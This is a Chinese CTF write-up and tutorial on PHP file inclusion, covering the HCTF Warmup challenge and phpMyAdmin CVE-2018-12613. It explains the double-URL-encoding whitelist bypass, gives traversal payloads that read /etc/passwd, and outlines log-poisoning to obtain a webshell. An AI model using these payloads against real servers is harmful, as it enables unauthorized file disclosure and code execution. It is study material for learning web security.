# Learning_web
## 文件包含
蒻姬我最开始接触这个 是一道[buuoj](https://buuoj.cn/challenges)的web签到题
![HCTF Warmup](https://s2.ax1x.com/2020/01/29/1QWo4S.png)
进入靶机，查看源代码
```php

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <!--source.php-->
    
    <br><img src="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg" /></body>
</html>
```
划重点 **<!--source.php-->**
进入这个php源
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```
再次划重点
```php

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```
看

有思路了
#### 只要通过这个判断就会执行file传递的参数的文件，想到可能时任意文件包含。

   _通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者检验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。_ 
  * 再看if中的判断，file参数不为空&&是个字符串&&通过checkFile方法的检验。去看checkFIle方法。
  
  
```php
public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }

```

看，hint.php 在白名单里！

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }


            
           


```
 进入hint.php  看到这样一行提示
**flag not here, and flag in ffffllllaaaagggg**
#### 再回想前面条件，首先必须存在并且是字符串
#### （必须使函数返回为true才能访问文件）
```php
if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;

```
然后判断参数是否在白名单中；



mb_strpos()的作用是查找**字符串在另一个字符串中首次出现的位置,即？在前面字符串中出现的位置**

而mb_substr()用以截断字符串。

然后和白名单比较。
又重复了一次上面的操作。
### 这个涉及到phpMyAdmin的一个洞CVE-2018-12613，由于PHP会自动urldecode一次，导致我们提交%253f（?的urlencode的urlencode）的时候自动转成%3f，满足if条件，%253f/就会被认为是一个目录，从而include。就有了下面的转化

#### ? --> %3f --> %253f
```latex
payload: file=hint.php%253f/…/…/…/…/…/…/…/ffffllllaaaagggg
```


------------

## 关于cve-2018-12613-PhpMyadmin后台文件包含
2018年6月19日，phpmyadmin在最新版本修复了一个严重级别的漏洞.

[https://www.phpmyadmin.net/security/PMASA-2018-4/](https://www.phpmyadmin.net/security/PMASA-2018-4/)

官方漏洞描述是这样的
```latex
An issue was discovered in phpMyAdmin 4.8.x before 4.8.2, in which an attacker can include (view and potentially 
execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded 
within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the 
"$cfg['AllowArbitraryServer'] = true" case (where an attacker can specify any host he/she is already in control of, 
and execute arbitrary code on phpMyAdmin) and the "$cfg['ServerDefault'] = 0" case (which bypasses the login 
requirement and runs the vulnerable code without any authentication).
```
**问题在index.php的55~63:**
```php
// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}
```
这里对于参数共有5个判断，**判断通过就可以通过Include包含文件**。

问题出在后两个上
```php
$target_blacklist = array (
    'import.php', 'export.php'
);
```
以及
Core::checkPageValidity($_REQUEST['target']):

代码在libraries\classes\Core.php的443~476：
```php
    public static function checkPageValidity(&$page, array $whitelist = [])
    {
        if (empty($whitelist)) {
            $whitelist = self::$goto_whitelist;
        }
        if (! isset($page) || !is_string($page)) {
            return false;
        }

        if (in_array($page, $whitelist)) {
            return true;
        }

        $_page = mb_substr(
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        $_page = urldecode($page);
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }

        return false;
    }
```
看，这跟上面的代码几乎是一个模子里刻出来的
  
  然后康康验证的白名单whitelist
  ```php
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
    );
```

之后phpMyAdmin的开发团队考虑到了target后面加参数的情况，**通过字符串分割将问号的前面部分取出**，继续匹配白名单，然后经过一遍urldecode后再重复动作。

得到payload
```php
target=db_datadict.php%253f/../../../../../../../../etc/passwd
```
### 此处再次~~分析~~胡扯文件包含漏洞的具体产生原因
- 程序员一般会把**重复使用的函数写到单个文件中**，需要使用某个函数时直接调用此文件，而无需再次编写，文件调用的过程一般被称为**文件包含**。
- 他们希望代码更灵活，所以将**被包含的文件设置为变量**，用来进行动态调用，
- 但正是由于这种灵活性，从而导致**客户端可以调用一个恶意文件**，造成文件包含漏洞。
- **几乎所有脚本语言都会提供文件包含的功能**，但文件包含漏洞在PHP Web Application中居多而在JSP、ASP、程序中却非常少，甚至没有，这是本身语言设计的弊端(猜测


------------
# Getshell
- 上传图片GETshell
- 读取文件，读取php文件
- 包含日志文件获取webshell
 
1. 首先找到文件存放位置
 有权限读取apache配置文件或是/etc/init.d/httpd
 默认位置/var/log/httpd/access_log

1. 让日志文件插入php代码
发送url请求时后插入php代码，一般使用burp suite抓包修改
curl发包
插入到get请求，或是user-agent部分

1. 包含日志文件（必须要权限包含）

### 举个栗子
```php
if (isset($_GET[page])) {
include $_GET[page];
} else {
include "hint.PHP";
}

```
**其中$_GET[page]使用户可以控制变量。如果没有严格的过滤就导致漏洞的出现**

### 代码审计
包含文件的函数
- include()
- include_once()
- require()
- require_once()

参考链接[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12613](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12613)


------------
暂停一下，摸鱼去了
明天再更qwq



















